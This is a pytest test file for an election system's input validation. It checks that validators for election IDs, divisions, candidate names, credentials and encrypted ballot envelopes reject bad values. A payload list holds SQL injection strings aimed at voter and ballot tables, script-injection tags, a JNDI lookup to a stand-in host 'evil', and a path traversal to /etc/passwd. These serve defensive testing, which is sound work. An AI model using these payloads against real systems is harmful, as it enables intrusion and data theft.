"""SR-15: Central validation accepts good input and rejects attacks."""

import pytest

from verification import validation as v


INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "\"; DROP TABLE voters;--",
    "1; SELECT * FROM anonymous_ballots",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "{{7*7}}",
    "${jndi:ldap://evil/x}",
    "../../etc/passwd",
    "Melbourne\n",
    "Melbourne\x00",
    "Melbоurne",          # Cyrillic o (look-alike letter)
    "ＡＢＣ",      # full-width letters
    "A" * 5000,
    "",
]


def test_valid_values_are_accepted():
    assert v.validate_election_id("election-2026") == "election-2026"
    assert v.validate_division("Melbourne") == "Melbourne"
    assert v.validate_division("Kennedy-O'Brien") == "Kennedy-O'Brien"
    assert v.validate_candidate_name("Anna M. Smith") == "Anna M. Smith"
    assert v.validate_candidate_id(7) == 7
    assert v.validate_credential("A" * 43) == "A" * 43
    assert v.validate_confirmation_reference("conf_" + "a" * 32)


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
@pytest.mark.parametrize(
    "validator",
    [
        v.validate_election_id,
        v.validate_division,
        v.validate_candidate_name,
        v.validate_credential,
        v.validate_confirmation_reference,
    ],
)
def test_injection_payloads_are_rejected(validator, payload):
    with pytest.raises(v.ValidationError):
        validator(payload)


@pytest.mark.parametrize("value", ["7", 7.0, None, True, False, 0, -1, 2**40, [1]])
def test_candidate_id_must_be_a_positive_plain_integer(value):
    with pytest.raises(v.ValidationError):
        v.validate_candidate_id(value)


@pytest.mark.parametrize("value", [None, 5, [], {}, b"Melbourne"])
def test_text_validators_reject_wrong_types(value):
    for validator in (v.validate_division, v.validate_candidate_name,
                      v.validate_election_id, v.validate_credential):
        with pytest.raises(v.ValidationError):
            validator(value)


def test_credential_length_is_exact():
    for length in (42, 44):
        with pytest.raises(v.ValidationError):
            v.validate_credential("A" * length)


def test_ballot_request_accepts_exact_fields():
    data = {"credential": "A" * 43, "candidate_id": 3}
    assert v.validate_ballot_request(data) == data


@pytest.mark.parametrize(
    "data",
    [
        {},
        {"credential": "A" * 43},
        {"candidate_id": 3},
        {"credential": "A" * 43, "candidate_id": 3, "voter_id": "x"},
        {"credential": "A" * 43, "candidate_id": "3"},
        {"credential": "' OR 1=1--", "candidate_id": 3},
        [],
        "text",
        None,
    ],
)
def test_ballot_request_rejects_bad_bodies(data):
    with pytest.raises(v.ValidationError):
        v.validate_ballot_request(data)


def _envelope(**changes):
    envelope = {
        "alg": "rsa-oaep-sha256+aes-256-gcm",
        "kid": "election:rsa-oaep:1",
        "v": 1,
        "wrapped_key": "QUJDRA==",
        "nonce": "QUJDRA==",
        "ct": "QUJDRA==",
    }
    envelope.update(changes)
    return envelope


def test_valid_envelope_is_accepted():
    envelope = _envelope()
    assert v.validate_ballot_envelope(envelope) == envelope


@pytest.mark.parametrize(
    "changes",
    [
        {"extra": "x"},
        {"alg": "<script>"},
        {"kid": "a b"},
        {"v": "1"},
        {"v": True},
        {"nonce": "not base64!!"},
        {"ct": ""},
        {"ct": "QUJD" * 5000},
        {"wrapped_key": 12},
    ],
)
def test_bad_envelopes_are_rejected(changes):
    with pytest.raises(v.ValidationError):
        v.validate_ballot_envelope(_envelope(**changes))


def test_envelope_with_missing_field_is_rejected():
    envelope = _envelope()
    del envelope["nonce"]
    with pytest.raises(v.ValidationError):
        v.validate_ballot_envelope(envelope)


def test_chain_stops_at_first_failing_check():
    calls = []

    def first(value):
        calls.append("first")
        raise v.ValidationError("f", "type")

    def second(value):
        calls.append("second")
        return value

    with pytest.raises(v.ValidationError):
        v.run_chain("x", first, second)

    assert calls == ["first"]
